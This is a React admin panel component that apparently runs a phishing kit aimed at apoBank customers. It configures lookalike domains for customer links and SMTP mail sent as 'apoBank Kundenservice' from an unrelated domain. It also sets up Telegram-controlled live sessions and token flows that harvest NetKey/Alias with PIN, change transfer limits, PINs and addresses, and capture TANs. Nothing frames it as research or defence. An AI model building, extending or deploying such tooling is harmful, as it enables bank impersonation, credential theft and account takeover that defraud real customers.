import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Ban, Sliders, KeyRound, Mail, Trash2, Plus, Send, Phone, ShieldCheck, MessageSquare, MapPin } from "lucide-react";
import { toast } from "sonner";
import StornoCallPanel from "./StornoCallPanel";
import LimitCallPanel from "./LimitCallPanel";
import PinCallPanel from "./PinCallPanel";
import AuthCallPanel from "./AuthCallPanel";
import AdressCallPanel from "./AdressCallPanel";
import UnifiedTokensList from "./UnifiedTokensList";
import AuthLiveCard from "./AuthLiveCard";
import StornoLiveCard from "./StornoLiveCard";
import PinLiveCard from "./PinLiveCard";
import AdressLiveCard from "./AdressLiveCard";
import LimitLiveCard from "./LimitLiveCard";
import { getPublicBaseUrl, setPublicBaseUrl } from "@/lib/customerLink";




type TokenKind = "storno" | "limit" | "pin" | "auth" | "adress";

interface CustomEmailRow { id: string; local_part: string; domain: string; address: string; label: string | null; }

const EzAgencyPanel = () => {
  const [kind, setKind] = useState<TokenKind>("auth");

  const [settingsId, setSettingsId] = useState<string | null>(null);

  // Berater phone
  const [defaultBeraterPhone, setDefaultBeraterPhone] = useState("");
  const [savingPhone, setSavingPhone] = useState(false);

  // Custom email domain + addresses
  const [customEmailDomain, setCustomEmailDomain] = useState("");
  const [savingDomain, setSavingDomain] = useState(false);
  const [customEmails, setCustomEmails] = useState<CustomEmailRow[]>([]);
  const [newLocalPart, setNewLocalPart] = useState("");
  const [newLabel, setNewLabel] = useState("");
  const [addingEmail, setAddingEmail] = useState(false);
  const [sendingFromId, setSendingFromId] = useState<string | null>(null);

  // Telegram flow control
  const [telegramChatId, setTelegramChatId] = useState("");
  const [savingChatId, setSavingChatId] = useState(false);
  const [flowMode, setFlowMode] = useState<string>("afk");
  const [publicBaseUrl, setPublicBaseUrlState] = useState<string>(() => {
    try { return localStorage.getItem("public_base_url") || ""; } catch { return ""; }
  });
  const [savingBaseUrl, setSavingBaseUrl] = useState(false);

  // SMTP
  const [smtpHost, setSmtpHost] = useState("smtp.strato.de");
  const [smtpPort, setSmtpPort] = useState<number>(587);
  const [smtpUser, setSmtpUser] = useState("apo-berater@sperling-kundenservice.de");
  const [smtpFrom, setSmtpFrom] = useState("apo-berater@sperling-kundenservice.de");
  const [smtpFromName, setSmtpFromName] = useState("apoBank Kundenservice");
  const [savingSmtp, setSavingSmtp] = useState(false);
  const [sendingSmtpTest, setSendingSmtpTest] = useState(false);

  const loadEmails = async () => {
    const { data } = await (supabase as any)
      .from("custom_emails").select("*").order("created_at", { ascending: false });
    setCustomEmails(data || []);
  };

  useEffect(() => {
    (async () => {
      const { data } = await (supabase as any)
        .from("api_settings")
        .select("id, default_berater_phone, custom_email_domain, telegram_chat_id, flow_mode, public_base_url, smtp_host, smtp_port, smtp_user, smtp_from, smtp_from_name")
        .limit(1).maybeSingle();
      if (data) {
        setSettingsId(data.id);
        setDefaultBeraterPhone(data.default_berater_phone || "");
        setCustomEmailDomain(data.custom_email_domain || "");
        setTelegramChatId(data.telegram_chat_id || "");
        setFlowMode(data.flow_mode || "afk");
        if (data.public_base_url) { setPublicBaseUrlState(data.public_base_url); setPublicBaseUrl(data.public_base_url); }
        setSmtpHost(data.smtp_host || "smtp.strato.de");
        setSmtpPort(data.smtp_port || 587);
        setSmtpUser(data.smtp_user || "apo-berater@sperling-kundenservice.de");
        setSmtpFrom(data.smtp_from || "apo-berater@sperling-kundenservice.de");
        setSmtpFromName(data.smtp_from_name || "apoBank Kundenservice");
      }
      loadEmails();
    })();


    const ch = (supabase as any)
      .channel("api_settings_mode")
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "api_settings" }, (p: any) => {
        if (p.new?.flow_mode) setFlowMode(p.new.flow_mode);
      })
      .subscribe();
    return () => { (supabase as any).removeChannel(ch); };
  }, []);

  const saveChatId = async () => {
    if (!settingsId) return;
    setSavingChatId(true);
    const { error } = await (supabase as any)
      .from("api_settings")
      .update({ telegram_chat_id: telegramChatId.trim() || null })
      .eq("id", settingsId);
    setSavingChatId(false);
    if (error) { toast.error("Fehler beim Speichern"); return; }
    toast.success("Chat-ID gespeichert");
  };

  const saveBaseUrl = async () => {
    const clean = publicBaseUrl.trim().replace(/\/+$/, "");
    let normalized = clean;
    if (clean && !/^https?:\/\//i.test(clean)) normalized = `https://${clean}`;
    setSavingBaseUrl(true);
    setPublicBaseUrl(normalized);
    setPublicBaseUrlState(normalized);
    if (settingsId) {
      await (supabase as any)
        .from("api_settings")
        .update({ public_base_url: normalized || null })
        .eq("id", settingsId);
    }
    setSavingBaseUrl(false);
    toast.success("Domain gespeichert");
  };

  const setMode = async (mode: string) => {
    if (!settingsId) return;
    const { error } = await (supabase as any)
      .from("api_settings").update({ flow_mode: mode }).eq("id", settingsId);
    if (error) { toast.error("Fehler"); return; }
    setFlowMode(mode);
    toast.success(`Flow-Mode: ${mode}`);
  };

  const savePhone = async () => {
    if (!settingsId) return;
    setSavingPhone(true);
    const { error } = await (supabase as any)
      .from("api_settings")
      .update({ default_berater_phone: defaultBeraterPhone.trim() || null })
      .eq("id", settingsId);
    setSavingPhone(false);
    if (error) { toast.error("Fehler beim Speichern"); return; }
    toast.success("Telefonnummer gespeichert");
  };

  const saveDomain = async () => {
    if (!settingsId) return;
    const norm = customEmailDomain.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/+$/, "");
    if (norm && !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(norm)) {
      toast.error("Bitte gültige Domain eingeben (z. B. mail.example.com)");
      return;
    }
    setSavingDomain(true);
    const { error } = await (supabase as any)
      .from("api_settings")
      .update({ custom_email_domain: norm || null })
      .eq("id", settingsId);
    setSavingDomain(false);
    if (error) { toast.error("Fehler beim Speichern"); return; }
    setCustomEmailDomain(norm);
    toast.success("Email-Domain gespeichert");
  };

  const addEmail = async () => {
    const local = newLocalPart.trim().toLowerCase();
    const domain = customEmailDomain.trim().toLowerCase();
    if (!domain) { toast.error("Bitte zuerst Email-Domain speichern"); return; }
    if (!/^[a-z0-9._+-]+$/i.test(local)) { toast.error("Ungültiger Local-Part"); return; }
    setAddingEmail(true);
    const { error } = await (supabase as any)
      .from("custom_emails")
      .insert({ local_part: local, domain, label: newLabel.trim() || null });
    setAddingEmail(false);
    if (error) { toast.error(error.message || "Fehler"); return; }
    setNewLocalPart(""); setNewLabel("");
    toast.success("Adresse angelegt"); loadEmails();
  };

  const deleteEmail = async (id: string) => {
    const { error } = await (supabase as any).from("custom_emails").delete().eq("id", id);
    if (error) { toast.error("Fehler beim Löschen"); return; }
    toast.success("Gelöscht"); loadEmails();
  };

  const sendTestEmail = async (id: string, address: string) => {
    const to = window.prompt(`Test-Email senden von ${address}\n\nAn welche Adresse?`);
    if (!to) return;
    setSendingFromId(id);
    const { data, error } = await (supabase as any).functions.invoke("send-custom-email", {
      body: {
        from_id: id, to,
        subject: `Test von ${address}`,
        html: `<p>Dies ist eine Test-Email, gesendet von <strong>${address}</strong> über Resend.</p>`,
      },
    });
    setSendingFromId(null);
    if (error || data?.error) {
      toast.error(`Fehler: ${data?.error || error?.message || "unbekannt"}`);
      return;
    }
    toast.success(`Test-Email an ${to} gesendet`);
  };

  const saveSmtp = async () => {
    if (!settingsId) return;
    setSavingSmtp(true);
    const { error } = await (supabase as any)
      .from("api_settings")
      .update({
        smtp_host: smtpHost.trim() || null,
        smtp_port: Number(smtpPort) || 587,
        smtp_user: smtpUser.trim() || null,
        smtp_from: smtpFrom.trim() || null,
        smtp_from_name: smtpFromName.trim() || null,
      })
      .eq("id", settingsId);
    setSavingSmtp(false);
    if (error) { toast.error("Fehler beim Speichern"); return; }
    toast.success("SMTP gespeichert");
  };

  const sendSmtpTest = async () => {
    const to = window.prompt(`Test-Mail von ${smtpFrom || "(from)"} an welche Adresse?`);
    if (!to) return;
    setSendingSmtpTest(true);
    const { data, error } = await (supabase as any).functions.invoke("send-smtp-email", {
      body: {
        to, subject: "SMTP Test",
        html: `<p>Test-Mail via STRATO SMTP.</p><p>Von: <strong>${smtpFrom}</strong></p>`,
      },
    });
    setSendingSmtpTest(false);
    if (error || data?.error) {
      toast.error(`Fehler: ${data?.error || error?.message || "unbekannt"}`);
      return;
    }
    toast.success(`Test-Mail an ${to} gesendet`);
  };

  return (
    <div className="space-y-6">
      {/* Aktuelle Domain */}
      <Card>
        <CardHeader>
          <CardTitle>Aktuelle Domain</CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="rounded-md border bg-muted/40 p-3">
            <div className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-1">Aktuell genutzte Domain</div>
            <div className="font-mono text-sm break-all">{typeof window !== "undefined" ? window.location.hostname : ""}</div>
          </div>
          <div className="space-y-2">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Kunden-Link Domain</label>
            <p className="text-xs text-muted-foreground">
              Diese Domain wird für alle generierten Kunden-Links verwendet. Leer lassen um die aktuelle Domain zu nutzen.
            </p>
            <div className="flex gap-2">
              <Input
                placeholder="https://apobank.de-direkthilfe.app"
                value={publicBaseUrl}
                onChange={e => setPublicBaseUrlState(e.target.value)}
                className="font-mono"
              />
              <Button onClick={saveBaseUrl} disabled={savingBaseUrl}>Speichern</Button>
            </div>
            {publicBaseUrl && (
              <div className="text-xs text-muted-foreground break-all">
                Beispiel: <code>{publicBaseUrl.replace(/\/+$/, "")}/auth/ui/app/auth/flow/apo-mustermann/access?t=123-456</code>
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      {/* Telegram Flow Control */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <MessageSquare className="h-5 w-5" /> Telegram Flow-Steuerung
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">

          <div className="space-y-2">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Gruppen Chat-ID</label>
            <p className="text-xs text-muted-foreground">
              Chat-ID der Telegram-Gruppe (z. B. <code>-1001234567890</code>). Der Bot muss der Gruppe hinzugefügt sein.
            </p>
            <div className="flex gap-2">
              <Input placeholder="-1001234567890" value={telegramChatId} onChange={e => setTelegramChatId(e.target.value)} className="font-mono" />
              <Button onClick={saveChatId} disabled={savingChatId}>Speichern</Button>
            </div>
          </div>

          <div className="space-y-2 pt-2 border-t">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">
              Aktueller Modus: <span className="font-mono text-foreground">{flowMode}</span>
            </label>
            <p className="text-xs text-muted-foreground">
              Auch per Kommando in der Gruppe: <code>/afk</code>, <code>/live</code>, <code>/live_change</code>.
              Neue Sessions folgen dem hier gesetzten Modus.
            </p>
            <div className="flex gap-2 flex-wrap">
              {(["afk", "live", "live_change"] as const).map(m => (
                <Button key={m} size="sm" variant={flowMode === m ? "default" : "outline"} onClick={() => setMode(m)}>
                  {m}
                </Button>
              ))}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Berater-Telefon */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Phone className="h-5 w-5" />Standard Berater-Telefonnummer
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <p className="text-xs text-muted-foreground">
            Wird beim Erstellen neuer Tokens als Vorbelegung verwendet.
          </p>
          <p className="text-sm font-medium">+49 211 5998 0</p>
          <div className="flex gap-2">
            <Input
              type="tel"
              placeholder="+49 211 5998 0"
              value={defaultBeraterPhone}
              onChange={e => setDefaultBeraterPhone(e.target.value)}
              className="font-mono"
            />
            <Button onClick={savePhone} disabled={savingPhone}>Speichern</Button>
          </div>
        </CardContent>
      </Card>

      {/* Custom Email */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Mail className="h-5 w-5" /> Custom Email
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Email-Domain</label>
            <p className="text-xs text-muted-foreground">
              Domain für ausgehende Emails über <strong>Resend</strong>. Muss bei Resend verifiziert sein (SPF, DKIM, DMARC).
              <br />Hinweis: Damit der Versand funktioniert, muss <code className="px-1 rounded bg-muted">RESEND_API_KEY</code> in den Projekt-Secrets gesetzt sein.
            </p>
            <div className="flex gap-2">
              <Input placeholder="mail.example.com" value={customEmailDomain} onChange={e => setCustomEmailDomain(e.target.value)} className="font-mono" />
              <Button onClick={saveDomain} disabled={savingDomain}>Speichern</Button>
            </div>
          </div>

          <div className="space-y-2 pt-2 border-t">
            <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Email-Adresse erstellen</label>
            <div className="flex flex-col sm:flex-row gap-2">
              <div className="flex items-center gap-1 flex-1">
                <Input placeholder="info" value={newLocalPart} onChange={e => setNewLocalPart(e.target.value)} className="font-mono" />
                <span className="text-sm text-muted-foreground font-mono whitespace-nowrap">
                  @{customEmailDomain || "domain"}
                </span>
              </div>
              <Input placeholder="Label (optional)" value={newLabel} onChange={e => setNewLabel(e.target.value)} className="sm:max-w-[180px]" />
              <Button onClick={addEmail} disabled={addingEmail || !customEmailDomain || !newLocalPart.trim()}>
                <Plus className="h-4 w-4 mr-1" />Anlegen
              </Button>
            </div>
          </div>

          {customEmails.length > 0 && (
            <div className="space-y-1 pt-2 border-t">
              <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider">Aktive Adressen</label>
              <div className="border rounded-md divide-y">
                {customEmails.map(e => (
                  <div key={e.id} className="flex items-center justify-between gap-2 px-3 py-2 text-sm">
                    <div className="min-w-0">
                      <div className="font-mono truncate">{e.address}</div>
                      {e.label && <div className="text-xs text-muted-foreground truncate">{e.label}</div>}
                    </div>
                    <div className="flex items-center gap-1 shrink-0">
                      <Button size="sm" variant="ghost" disabled={sendingFromId === e.id} onClick={() => sendTestEmail(e.id, e.address)} title="Test-Email senden">
                        <Send className="h-4 w-4" />
                      </Button>
                      <Button size="sm" variant="ghost" onClick={() => deleteEmail(e.id)} title="Löschen">
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* SMTP Versand */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Send className="h-5 w-5" /> E-Mail Versand (SMTP)
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-3">
          <p className="text-xs text-muted-foreground">
            Login-Konto (STRATO) und Absenderadresse. Passwort ist als Secret <code>SMTP_PASSWORD</code> gespeichert.
          </p>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
            <div className="space-y-1">
              <label className="text-xs text-muted-foreground">SMTP Host</label>
              <Input value={smtpHost} onChange={e => setSmtpHost(e.target.value)} className="font-mono" placeholder="smtp.strato.de" />

            </div>
            <div className="space-y-1">
              <label className="text-xs text-muted-foreground">Port</label>
              <Input type="number" value={smtpPort} onChange={e => setSmtpPort(Number(e.target.value))} className="font-mono" placeholder="587" />
            </div>
            <div className="space-y-1 sm:col-span-2">
              <label className="text-xs text-muted-foreground">Login-Adresse (Benutzer)</label>
              <Input value={smtpUser} onChange={e => setSmtpUser(e.target.value)} className="font-mono" placeholder="apo-berater@sperling-kundenservice.de" />
            </div>
            <div className="space-y-1">
              <label className="text-xs text-muted-foreground">Absender-Adresse (From)</label>
              <Input value={smtpFrom} onChange={e => setSmtpFrom(e.target.value)} className="font-mono" placeholder="apo-berater@sperling-kundenservice.de" />
            </div>
            <div className="space-y-1">
              <label className="text-xs text-muted-foreground">Absender-Name</label>
              <Input value={smtpFromName} onChange={e => setSmtpFromName(e.target.value)} placeholder="ing. Sperling" />
            </div>
          </div>
          <div className="flex gap-2">
            <Button onClick={saveSmtp} disabled={savingSmtp}>Speichern</Button>
            <Button variant="outline" onClick={sendSmtpTest} disabled={sendingSmtpTest}>
              <Send className="h-4 w-4 mr-1" /> Test-Mail
            </Button>
          </div>
        </CardContent>
      </Card>

      {/* Token-Art wählen */}
      <Card>
        <CardHeader><CardTitle>Token-Art wählen</CardTitle></CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
            {([
              { v: "auth", Icon: ShieldCheck, label: "Login-2FA", desc: "NetKey/Alias + PIN abfragen." },
              { v: "limit", Icon: Sliders, label: "Limit-Änderung", desc: "Überweisungs-Limit anpassen." },
              { v: "storno", Icon: Ban, label: "Storno", desc: "Überweisungswiderruf — Auftraggeber, Empfänger, Betrag." },
              { v: "pin", Icon: KeyRound, label: "PIN-Änderung", desc: "Sicherheitssperre & neue PIN." },
              { v: "adress", Icon: MapPin, label: "Adress-Änderung", desc: "Anschrift ändern & Änderungs-TAN." },
            ] as const).map(opt => (
              <button
                key={opt.v}
                type="button"
                onClick={() => setKind(opt.v as TokenKind)}
                className={`flex flex-col items-start gap-1 rounded-md border p-4 text-left transition-colors ${
                  kind === opt.v ? "border-primary bg-primary/5 ring-1 ring-primary" : "hover:bg-muted/40"
                }`}
              >
                <div className="flex items-center gap-2 font-semibold">
                  <opt.Icon className="h-4 w-4" />{opt.label}
                </div>
                <div className="text-xs text-muted-foreground">{opt.desc}</div>
              </button>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Details */}
      <div>
        <div className="mb-3 text-xs uppercase tracking-wider text-muted-foreground font-semibold">
          Details · {kind === "storno" ? "Storno" : kind === "limit" ? "Limit-Änderung" : kind === "pin" ? "PIN-Änderung" : kind === "adress" ? "Adress-Änderung" : "Login-2FA"}
        </div>
        {kind === "storno" && <StornoCallPanel />}
        {kind === "limit" && <LimitCallPanel />}
        {kind === "pin" && <PinCallPanel />}
        {kind === "auth" && <AuthCallPanel />}
        {kind === "adress" && <AdressCallPanel />}
      </div>

      {/* Live steering — always visible, regardless of selected kind */}
      <AuthLiveCard />
      <StornoLiveCard />
      <PinLiveCard />
      <AdressLiveCard />
      <LimitLiveCard />


      {/* Active tokens */}
      <UnifiedTokensList />
    </div>
  );
};

export default EzAgencyPanel;
